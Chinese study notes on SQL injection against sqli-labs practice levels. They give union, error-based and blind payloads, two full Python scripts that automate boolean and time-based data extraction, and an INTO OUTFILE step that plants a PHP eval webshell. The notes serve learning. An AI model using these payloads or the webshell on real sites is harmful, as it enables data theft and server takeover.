# sql注入学习

## 基础知识

视频教程：[SQL注入由简入精_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1c34y1h7So/)

### 什么是注入

所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终到达欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。

### 什么是注入点

注入点就是可以实行注入的地方，通常是一个访问数据库的连接。如本页面注入点input the ID

![6c76cc7285412f75f4a0901c8d69039](https://s2.loli.net/2024/11/21/ZHRmjQCs2KD8hkP.png)

### 注入分类

#### 按照查询方法

1. 字符型 ：当输入的参数为字符串时，称为字符型
2. 数字型 ：当输入的参数为整型时，可以认为是数字型注入

#### 按照注入方法

1. Union注入
2. 报错注入
3. 布尔注入
4. 时间注入

#### 如何判断是字符型注入还是数字型注入

参考文档：[怎么判断是字符型注入还是数字型注入-CSDN博客](https://blog.csdn.net/chenzzhenguo/article/details/108842399)

使用`and 1=1`和`and 1=2`来判断

**数字型一般提交内容为数字，但数字不一定为数字型**

### 闭合方式

` ''  ""  ')  ") ....`

#### **MySQL 的类型包容性和自动转换**

MySQL 在处理数据输入时，对数据类型有较高的包容性。当你输入的值类型不完全符合数据库要求时，MySQL 通常会尝试将其**自动转换为期望的类型**。

举例，如果闭合方式是"),那么输入1'就不会报错，会自动转化成数学型1；而输入1"则会报错，因为"作为闭合的一部分会在语句中执行，而"后缺少）作为完整的闭合，所以会报错

#### 如何判断闭合方式

参考文档：[sql注入单引号闭合原理-CSDN博客](https://blog.csdn.net/weixin_46634468/article/details/120480080)

##### 方法一

有回显报错，输入1\则报错\之后则是闭合方式

##### 方法二

无回显报错

首先尝试：
?id=1’
?id=1”
结果一：如果都报错
判断闭合符为：整形闭合。

结果二：如果单引号报错，双引号不报错。
继续尝试
?id=1’ –-+
结果1：无报错
判断闭合符为：单引号闭合。
结果2：报错
判断闭合符可能为：单引号加括号。

结果三：如果单引号不报错，双引号报错。
继续尝试
?id=1" -–+
结果1：结果无报错
判断闭合符为：双引号闭合。
结果2：报错
判断闭合符可能为：双引号加括号。

注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判段有多少个括号，可以使用二分法来快速判断

#### 闭合的作用

手工提交闭合符号，结束前一段查询语句后面即可加入其他语句，查询需要的参数不需要的语句可以用注释符号'--+’或'#’或’%23’注释掉

### SQL

#### 常用函数

- `show databases` 查询所有库
- `use  库名`  进入库
- `show tables`  查询库中的所有表 
- `select * from 表名`   查询表中的所有数据
- `show database()`  返回当前使用的数据库
- `group_concat()`  把数据库中的某列数据或某几列数据合并为一个字符串 
- `union  联合查询` ，将前后查询到的内容合并为一张表    

​       注：1.前后查询字段数量一致  2. 前后查询互不影响

- `order by x`  按照x字段排序   注：若超出表的字段，则返回报错
- `select version（）`查询数据库版本

#### SQL 关键库

参考文档：[MySQL内置数据库information_schema 详解](https://blog.csdn.net/weixin_45152456/article/details/143025249)

#### Information_schema

| SCHEMATA | 提供了当前mysql实例中所有数据库的信息。show databases的结果取之此表 |
| :------: | ------------------------------------------------------------ |
|  TABLES  | 提供了关于数据库中的所有表的信息（包括视图）。详细表述了某个表属于哪个schema、表类型、表引擎、创建时间等信息。`show tables from schema_name`的结果取之此表 |
| COLUMNS  | 提供了表中的所有列信息。详细表述了某张表的所有列以及每个列的信息。`show columns from schema_name.table_name`的结果取之此表 |

### Union联合注入流程

?id=1 and 1=1

1. 判断注入类型

2. 判断有无闭合 and 1=1 and 1=2 //结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+闭合

3. 猜解字段 order by 10 //采用二分法 

4. 判断数据回显位置 -1 union select 1，2，3，4，5.... //参数等号后面加-表示不显示当前数据 

5. 获取当前数据库名、用户、版本 union select version(),database()，user()，

6. 获取全部数据库名

* `union select 1,2,(select group_concat(schema_name)from information_schema.schemata)`

​        获取表名

-  `union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='库名')`
- ` union select 1,group_concat(table_name)from information_schema.tables where table_schema='库名'`

​         获取字段名

- `union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='表名')`
-  `union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' `

​         获取数据 

* `union select 1,2,(select group_concat(字段1，字段2)from 库名.表名`

查 库名： `select schema_name from information_schema.schema`

查 表名： `select table_name from information_schema.tables where table_schema=库名`

查 列名： `select column_name from information_schema.columns where table_name=表名`

查数据： `select 列名 from 库名.表名`

### 报错注入

参考文档：[SQL注入实战之报错注入篇](https://www.cnblogs.com/c1047509362/p/12806297.html)

![951263b3b81edcb0450406395bfa3a2](https://s2.loli.net/2024/11/21/De7N8o1UYMAbwjc.png)

#### extractvalue 报错注入

##### extracvalue函数

`extracvalue(name(列名)(不重要),path(路径))` `like extravalue(doc,'/book/title')` 

默认返回32字符

##### 如何执行报错

`extracvalue(name,~path)` 会将path中的内容执行并显示报错

`like extravalue(doc,'~book/title')` 

`or extravalue(1,concat(0x7e,(select database())))  `

`//0x7e为~的ASCLL码，concat(1,2)将1,2连接,(select ...)()括号中的内容先执行`

##### 使用方法

1. `?id=1 union 1,2,extractvalue(name,~path) --+`  `like ?id=1 union 1,2,extractvalue(1,concat(0x7e,(select database()))) --+ `

2. `?id=1 and 1= extractvalue(name,~path)` `like ?id=1 and 1=extractvalue(1,concat(0x7e,(select database()))) --+ `



##### substring函数

由于extractvalue函数默认返回32字符，因此如果需要查看之后的内容要用到substring函数

`substring(内容,number A,number B) 从A字符开始显示个字符`  

`like  extravalue(1,concat(0x7e,(select substring(database(),1,30)))) 从第一个字符开始显示30个字符`



#### updatexml报错注入

##### updatexml函数

`updatexml(doc,path,new_value)` `like updatexml(doc,'/book/author','1')`

默认返回32字符

##### 如何执行报错

同上extractvalue(),依旧是在path中执行报错

`like ?id=1 and 1=updatexml(1,concat(0x7e,(select database())),3) --+ 

#### floor报错注入

### 盲注

#### 什么是盲注

页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入。

#### 盲注分类

1. 布尔盲注
2. 时间盲注
3. 报错盲注

#### 布尔盲注

##### 使用条件

web页面只返回True真，False假两种类型利用页面返回不同，逐个猜解数据

如：sqli-labs第8题

正确返回You are in....错误返回空白

##### 关键函数

###### ascii()

美国信息交换标准代码,可以把字母转换为对应数字

只能将（）括号内的第一个字符返回ascll值

###### length()

`length(str)`:返回str串长度

##### 使用方法

1.确定存在sql漏洞

2.获取闭合方式

3.构建布尔盲注语句

##### 注入语句

获取数据库

长度 

`?id=1' and length(database())=x --+ x为查询数字，如果正确，页面返回True 如果错误，页面不返回内容`

`like ?id=1' AND LENGTH(database())=1 --+`

名称

`?id=1' and ascii(substring(database,x,1))>=x1 --+ x为查询数据库名字的第x个字符，x1与x的ascii值进行比较，进行判断`

`like ?id=1' AND ASCII(SUBSTRING(database(),1,1))>=97 --+`

~~当然也可以选择直接查询而不是用二分法的形式~~

获取表

长度

`?id=1' and  (select length(table_name) from information_schema.tables where  table_schema='  ' )=X --+ x为查询数字，同获取数据库长度,Y为第Y个表开始`

名称

`?id=1' and ascii(substring((select  table_name from information_schema.tables where table_schema='' limit Y,1),x,1))>=x1 --+  x为查询表名的第x个字符，x1与x的ascii值进行比较，进行判断,Y为第Y个表开始`

按照索引逐个列出表名，调整 `limit 0,1` 为 `limit 1,1`，`limit 2,1` 等以获取更多表名。

获取列

长度

`?id=1' and (select length(column_name) from information_schema.columns where table_name='target_table' limit Y,1)=x --+x为查询数字，同获取数据库长度 Y为第Y列开始`

名字

`?id=1' and ascii(substring((select column_name FROM information_schema.columns WHERE table_name='' limit Y,1),X,1))>=X1 --+ X是查询列名的第x个字符，x1与x的ascii比较，进行判断，Y为第Y个表开始`

获取数据

长度

`?id=1' and  (select length(column_name) from 库名.表名 limit Y,1)=x --+ x为查询数字,Y表示从第Y个数据开始 `

内容

`?id=1' and ascii(substing((select column_name from 库名.表名 LIMIT Y,1),X,1))>=x1 --+ X是查询数据内容的第x个字符，x1与x的ascii比较，进行判断，Y为第Y个数据开始`

手动似乎有些过于繁琐了，还是用脚本吧（）

###### 注入脚本

## 教学视频:[手把手教你学会SQL注入之布尔盲注Python脚本编写](https://www.bilibili.com/list/watchlater?oid=1851294346&bvid=BV1JW421w7WL&spm_id_from=333.880.top_right_bar_window_view_later.content.click)

  ~~搞了两三个小时终于出来了~~

根据sqli-labs Less8 ，可以更根据需求修改url 以及闭合方式

```python
import requests

global url
url="http://fca40d5f-175c-4f50-9c9a-9c5ab69a06a6.node5.buuoj.cn:81/Less-8/?id="
global chars
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!#.-"


def send_payload(payload):
    r=requests.get(url+payload)
    r.encoding="utf-8"
    if "You are in..........." in r.text:
        return True
    return False

#库名长度
def get_database_name_length():
    length=0
    while True:
        payload=f"-1' OR(select length(database())={length}) --+" #这里1'and 也可以是-1'or 或者'or
        if send_payload(payload):
            print("数据库名长度为",length)
            return length
        length += 1

#库名
def get_database_name(length):
    database=""
    for i in range(1,length+1):
        for char in chars:
            payload=f"-1'or ascii((select substr(database(),{i},1)))={ord(char)} --+"
            if send_payload(payload):
                database=database+char
                #print("数据库名为",database)
                break
    print("数据库名为", database)
    return database

#获取表数量
def get_tables_num(database):
    table_num=0
    while True:
        #print(table_num)
        payload = f"-1' OR((select count(table_name) from information_schema.tables where table_schema='{database}')={table_num}) --+"  # 这里1'and 也可以是-1'or 或者'or
        if send_payload(payload):
            print("表数量为", table_num)
            return table_num
        table_num+=1


#获取各个表名长度
def get_tables_name_length(database,table_num):
    table_name_length_list=[]
    for i in range(0, table_num):
        table_name_length = 0
        while True:
            #payload = f"'or length((select table_name from information_schema.tables where table_schema='{database}' limit{i},1))={table_name_length} --+"
            payload = f"'or length((select table_name from information_schema.tables where table_schema='{database}' limit {i},1))={table_name_length} --+"
            if send_payload(payload):
                print(f"第{i + 1}个表名长度为", table_name_length)
                table_name_length_list.append(table_name_length)
                break
            table_name_length +=1
    return table_name_length_list

#获取表名
def get_table_name(database,table_num,table_name_length_list):
    table_name_list=[]
    for i in range(0,table_num):
        table_name=""
        for j in range(1,table_name_length_list[i]+1):
            for char in chars:
                payload=f"'or (ascii(substr((select table_name from information_schema.tables where table_schema='{database}' limit {i},1),{j},1)))={ord(char)}--+"
                if send_payload(payload):
                    table_name+=char
                    #print(1)
                    break
        print(f"第{i + 1}个表名为", table_name)
        table_name_list.append(table_name)
    return table_name_list


#获取列的数量
def get_column_num(database,table_name_list):
    for table_name in table_name_list:
        column_num=0
        while True:
            #print(column_num)
            payload=f"' or (select count(column_name) from information_schema.columns where table_name='{table_name}')={column_num} --+"
            if send_payload(payload):
                print(f"{table_name}表的列数为:",column_num)
                break
            column_num+=1
        column_length_list=get_column_length(database,table_name,column_num)
        column_name_list=get_column_name(database,table_name,column_num,column_length_list)
        data_num_list=get_data_num(database,table_name,column_name_list)
        get_data(database,table_name,column_name_list,data_num_list)
#获取各个列的长度
def get_column_length(database,table_name,column_num):
    column_length_list=[]
    for i in range(0,column_num):
        column_length=0
        while True:
            #print(column_length)
            payload=f"'or (select length(column_name) from information_schema.columns where table_name='{table_name}' limit {i},1)={column_length}--+"
            if send_payload(payload):
                print(f"{table_name}的第{i+1}列名长度为：",column_length)
                column_length_list.append(column_length)
                break
            column_length+=1
    return column_length_list
#获取列名
def get_column_name(database,table_name,column_num,column_length_list):
    column_name_list=[]
    for i in range(0,column_num):
        column_name=""
        for j in range(1,column_length_list[i]+1):
            for char in chars:
                #print(char)
                #payload=f"' or (ascii(substr((select column_name from information_schema.columns where table_name='{table_name}' limit {i},1){j},1))={ord(char)} --+"
                payload = f"' OR {ord(char)} = (ASCII(SUBSTR((SELECT column_name from information_schema.columns WHERE table_name='{table_name}' limit {i},1),{j},1)))--+"
                if send_payload(payload):
                    column_name=column_name+char
                    print(f"{table_name}表的第{i+1}列的名为{column_name}")
                    break
        column_name_list.append(column_name)
    return column_name_list

#获取数据个数
def get_data_num(database,table_name,column_name_list):
    data_num_list=[]
    for column_name in column_name_list:
        data_num=0
        while True:
            payload=f"'or (select count({column_name}) from {database}.{table_name}) ={data_num}--+"
            if send_payload(payload):
                print(f"{table_name}表的{column_name}列共有{data_num}条数据")
                data_num_list.append(data_num)
                break
            data_num +=1
    return data_num_list

#获取数据
def get_data(database,table_name,column_name_list,data_num_list):
    for i in range(len(data_num_list)):
        for j in range(data_num_list[i]):
            data_length=0
            while True:
                payload=f"'or (select length({column_name_list[i]}) from {database}.{table_name} limit {j},1) ={data_length}--+"
                if send_payload(payload):
                    print(f"{table_name}表的第{j+1}条数据的第{i+1}列长度为{data_length}")
                    break
                data_length +=1
            data=''
            for k in range(data_length):
                for char in chars:
                    #print(char)
                    payload_=f"'or (ascii(substr(cast((select {column_name_list[i]} from {database}.{table_name} limit {j},1) as char),{k+1},1)))={ord(char)}--+"
                    if send_payload(payload_):
                        data+=char
                        #print(f"{table_name}表的第{j+1}列数据的第{i+1}列为",data)
                        #print("{}表的{}列第{}条数据的值为:".format(table_name, column_name_list[i], j + 1), data)
                        break
                print("{}表的{}列第{}条数据的值为:".format(table_name, column_name_list[i], j + 1), data)

if __name__ == '__main__':
    length=get_database_name_length()  #获取库名长度
    #length=8
    database=get_database_name(length) #获取库名
    #database='security'
    table_num=get_tables_num(database)  #获取表数量
    #table_num=4
    table_name_length_list=get_tables_name_length(database,table_num) #获取各个表名长度
    #table_name_length_list=[6,8,7,5]
    table_name_list=get_table_name(database,table_num,table_name_length_list) #获取各个表名
    #table_name_list=['emails','users','referers','uagents'] #为测试数据改换了表名的顺序
    get_column_num(database,table_name_list)
```

#### 时间盲注



脚本

    #!/usr/bin/python
    # -*- coding: utf-8 -*-
    import binascii
    
    import requests
    from fake_useragent import UserAgent
    
    
    def get_tables(url, payload_header, payload_end):
        # 获取长度
        length = 100
        for L in range(1, 1000):
            payload = url + payload_header + \
                      "length((select group_concat(table_name) from information_schema.tables " \
                      f"where table_schema=database()))={L}" + payload_end
            print(f'\r正在获取当前库所有表名拼接后长度：{L}', end='')
            if judge_time(payload):
                print(f'\n当前库所有表名拼接后长度：{L}', end='')
                length = L
                break
            elif L == 999:
                print(f'\r无法获取当前库所有表名拼接后长度为：{L}', end='')
        print()
    
        # 获取值
        tables_name = ''
        for i in range(1, length + 1):
            print(f'\r正在获取第{i}个值：{tables_name}', end='')
            for ascii_num in range(39, 123):
                payload = url + payload_header + \
                          f"(select ascii(mid(group_concat(table_name),{i},1)) from information_schema.tables " \
                          f"where table_schema=database())={ascii_num}" + payload_end
                if judge_time(payload):
                    tables_name += chr(ascii_num)
        tables_list = tables_name.split(',')
        print(f'\n获取所有表名结束：', end='')
        return tables_list
    
    
    def get_columns(table_name, url, payload_header, payload_end):
        # 获取长度
        length = 1000
        for L in range(1, 10000):
            payload = url + payload_header + \
                      f"length((select group_concat(column_name) from information_schema.columns " \
                      f"where table_schema=DATABASE() AND " \
                      f"""table_name=0x{str(binascii.b2a_hex(table_name.encode(r"utf-8"))).split("'")[1]}))={L}""" \
                      + payload_end
            print(f'\r正在获取{table_name}表所有字段名拼接后长度：{L}', end='')
            if judge_time(payload):
                print(f'\n{table_name}表所有字段名拼接后长度为：{L}', end='')
                length = L
                break
            elif L == 999:
                print(f'\r无法获取当{table_name}表所有字段名拼接后长度：{L}', end='')
        print()
    
        # 获取值
        columns_name = ''
        for i in range(1, length + 1):
            print(f'\r正在获取第{i}个值：{columns_name}', end='')
            for ascii_num in range(39, 123):
                payload = url + payload_header + \
                          f"(select ascii(mid(group_concat(column_name),{i},1)) from information_schema.columns " \
                          f"where table_schema=DATABASE() AND table_name=" \
                          f"""0x{str(binascii.b2a_hex(table_name.encode(r"utf-8"))).split("'")[1]})={ascii_num}""" \
                          + payload_end
                if judge_time(payload):
                    columns_name += chr(ascii_num)
        columns_list = columns_name.split(',')
        print(f'\n获取{table_name}表的所有字段名结束：', end='')
        return columns_list
    
    
    def get_data(chose_table, column_list, url, payload_header, payload_end):
        # 获取记录
        columns_name = ''
        for i in column_list:
            columns_name += f",{i}"
    
        # 获取长度
        length = 10000
        for L in range(1, 10000):
            payload = url + payload_header + \
                      f"length((select group_concat(concat_ws(':'{columns_name})) from {chose_table}))={L}""" \
                      + payload_end
            print(f'\r正在获取{chose_table}表所有记录拼接后长度：{L}', end='')
            if judge_time(payload):
                print(f'\n{chose_table}表所有记录拼接后长度为：{L}', end='')
                length = L
                break
            elif L == 9999:
                print(f'\r无法获取当{chose_table}表所有记录拼接后长度：{L}', end='')
    
        print()
        data = []
        data_str = ''
        # 获取值
        for i in range(1, length + 1):
            print(f'\r正在获取第{i}个值：{data_str}', end='')
            for ascii_num in range(39, 123):
                payload = url + payload_header + \
                          f"(select ascii(mid(group_concat(concat_ws(':'{columns_name})),{i},1)) from {chose_table})" \
                          f"={ascii_num} " + payload_end
                if judge_time(payload):
                    data_str += chr(ascii_num)
    
        data_list = data_str.split(',')
        for i in data_list:
            data.append(i.split(':'))
        print(f'\n获取{chose_table}表的所有记录结束：')
        return data
    
    
    def judge_time(payload):
        # 判断响应时间
        time = html_get_time(payload)
        if 3 <= time < 6:
            return True
        else:
            return False
    
    
    def html_get_time(url):
        # 返回响应时间
        req = requests.session()
        ua = UserAgent()
        headers = {'User-Agent': ua.random}
        timeout = 6
        response = req.get(url, headers=headers, timeout=timeout)
        return response.elapsed.seconds
    
    
    def main():
        url = 'http://192.168.8.46/sqli-labs-master/Less-9/?id=1'
        payload_header = "' and if("
        payload_end = ",sleep(3),1)--+"
    
        print('========Time-based-blind-SQL-injection==============')
        print('=====================By:AA8j========================')
        print('目标：' + url)
    
        # ------------------------获取表-------------------------------
        tables_list = get_tables(url, payload_header, payload_end)
        # tables_list = ['emails', 'referers', 'uagents', 'users']
        for i in range(0, len(tables_list)):
            print(f'{i + 1}.{tables_list[i]}', end=' ')
        chose_table = tables_list[int(input('\n请选择要获取字段的表名：')) - 1]
    
        # ------------------------获取字段-----------------------------
        columns_list = get_columns(chose_table, url, payload_header, payload_end)
        # columns_list = ['id', 'username', 'password']
        for i in range(0, len(columns_list)):
            print(f'{i + 1}.{columns_list[i]}', end=' ')
        print()
    
        # ------------------------获取记录-----------------------------
        data = get_data(chose_table, columns_list, url, payload_header, payload_end)
        # data = [['1', 'Dumb', 'Dumb'], ['2', 'Angelina', 'I-kill-you'], ['3', 'Dummy', 'p@ssword']]
        for i in columns_list:
            print(i.ljust(20), end='')
        print('\n' + '-' * len(columns_list) * 20)
        for i in data:
            for j in i:
                print(j.ljust(20), end='')
            print('\n' + '-' * len(columns_list) * 20)
    
    
    if __name__ == '__main__':
        main()
    





### 文件上传

#### 上传要点

1. show variables like '%secure%';用来查看mysql是否有读写文件的权限

2. 数据库的file权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限

3. into outfile命令使用的环境：必须知道一个，服务器上可以写入文件的文件夹的完整路径

#### 常用函数

1. `into dumpfile()`

2. `into outfile()`
3. `load_file()`

#### 文件上传指令

`?id=-1')) union select 1,"<?php @eval($ PoST['password');?>",3 into outfile"D:\\phpstudy_pro\\www\\ben.php"--+`

`<?php @eval($ POST['password']);?>`为一句话木马 //`<?php eval ($_POST[0]);`

password为预留密码`D:\\phpstudy_pro\\www`\\为文件路径,`ben.php`为新插入的文件名

上传成功之后可以使用蚁剑或中国菜刀进行查看

// 但这个方法似乎要本地路径才可以使用
